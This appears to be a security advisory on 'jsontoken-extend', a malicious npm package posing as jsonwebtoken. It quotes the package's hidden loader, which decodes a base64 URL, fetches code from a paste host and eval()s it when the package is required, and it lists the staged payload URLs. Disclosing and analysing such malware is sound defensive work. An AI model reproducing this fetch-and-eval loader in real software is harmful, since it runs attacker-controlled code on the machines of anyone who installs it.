summary: jsontoken-extend fetches and eval()s remote code from jsonkeeper.com on require
details: The package impersonates the public API of jsonwebtoken (sign/verify/decode, error classes) to lure installs. On require, index.js loads sign.js, whose top-level IIFE base64-decodes a hidden URL (https://www.jsonkeeper.com/b/SRGCL) from the constant HS_STRING, fetches it, and passes the JSON `content` field directly to eval(): `fetch(atob(HS_STRING)).then(t=>t.json()).then(data=>{ const codeString = data.content; eval(codeString); })`. The destination is a public paste-style host whose contents are fully attacker-mutable, and there is no integrity verification of the fetched code. A second base64-encoded URL (jsonkeeper.com/b/XAMRK in TOKEN_STRING) is staged alongside as a sibling payload. Any application that requires this package executes arbitrary attacker-controlled JavaScript in the installer's process at module-load time.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
